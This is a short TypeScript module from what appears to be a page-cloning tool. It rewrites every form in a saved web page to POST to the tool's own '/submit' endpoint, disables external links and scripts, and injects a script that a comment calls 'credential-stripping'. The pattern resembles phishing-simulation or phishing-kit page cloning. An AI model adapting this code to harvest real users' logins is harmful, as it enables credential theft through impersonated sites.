import * as cheerio from "cheerio";
import fs from "fs/promises";
import { getInjectionScript } from "./injection-script";

export async function modifyHtml(
  htmlPath: string,
  appUrl: string
): Promise<void> {
  const html = await fs.readFile(htmlPath, "utf-8");
  const $ = cheerio.load(html);

  // Rewrite all form actions to /submit
  $("form").each((_, el) => {
    $(el).attr("action", "/submit");
    $(el).attr("method", "POST");
    // Remove any existing onsubmit handlers
    $(el).removeAttr("onsubmit");
  });

  // Neutralize external links (make them no-ops)
  $("a").each((_, el) => {
    const href = $(el).attr("href");
    if (href && (href.startsWith("http") || href.startsWith("//"))) {
      $(el).attr("href", "#");
      $(el).attr("onclick", "return false;");
    }
  });

  // Remove existing scripts that might interfere
  $("script[src]").each((_, el) => {
    const src = $(el).attr("src") || "";
    // Keep inline scripts from SingleFile, remove external ones
    if (src.startsWith("http") || src.startsWith("//")) {
      $(el).remove();
    }
  });

  // Inject our credential-stripping script
  const injectionScript = getInjectionScript(appUrl);
  $("body").append(`<script>${injectionScript}</script>`);

  await fs.writeFile(htmlPath, $.html());
}
